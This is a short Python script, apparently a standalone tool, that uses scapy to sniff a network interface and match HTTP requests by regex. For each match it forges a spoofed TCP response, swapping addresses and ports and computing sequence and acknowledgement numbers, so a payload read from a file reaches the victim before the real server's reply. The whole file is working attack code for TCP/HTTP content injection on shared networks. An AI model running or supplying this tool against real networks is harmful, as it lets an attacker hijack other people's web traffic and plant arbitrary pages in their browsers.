from scapy.all import *
import socket
from copy import deepcopy
import threading
import argparse
import re


parser = argparse.ArgumentParser()
parser.add_argument("-i", help="network interface to sniff")
parser.add_argument("-r", help="regex to filter the packet according to request type")
parser.add_argument("-d", help="data file that contains the new payload")
parser.add_argument("-e", help="expression for scapy to filter packets")
parser.add_argument("-verbose", help="verbosity level")
terminalArgs = parser.parse_args()
'''
########################
#example things to supply to the terminal to sniff on http packets
interface = 'wlan0'
regex = '.*GET.*text\/html.*'
datafile = 'data.html'
expression = 'tcp port http'
#######################
'''




interface = terminalArgs.i
regex = terminalArgs.r
datafile = terminalArgs.d
expression = terminalArgs.e
file = open (datafile,'r').read()



def buildForgedPckt(pkt):
	match = re.search("("+regex+")", pkt.getlayer('TCP').load, re.DOTALL)
	if match is not None:
		fake_pkt = deepcopy(pkt)

		#fake_pkt[Ether].src, fake_pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src
		fake_pkt[IP].src, fake_pkt[IP].dst = pkt[IP].dst, pkt[IP].src  # Exchange IPs

		fake_pkt[TCP].sport, fake_pkt[TCP].dport = pkt[TCP].dport, pkt[TCP].sport   # Exchange Ports
		fake_pkt[TCP].seq = pkt.ack
		fake_pkt[TCP].ack = pkt.seq + (pkt.len - pkt[IP].ihl * 4 - 20) # Original packet length - (size_ip + size_tcp)
		fake_pkt[TCP].payload = file

		del(fake_pkt[IP].len)         # Recalculate the length of IP
		del(fake_pkt[IP].chksum) #Recalculate IP chksum after forging the packet
		del(fake_pkt[TCP].chksum) #Recalculate TCP chksum after forging the packet
		sendp(fake_pkt)



def customAction(pckt):
	if hasattr(pckt.getlayer('TCP'), 'load'):
		buildForgedPckt(pckt)

packets = sniff (count = 0, iface = interface, filter = expression, prn = lambda pkt: customAction(pkt))
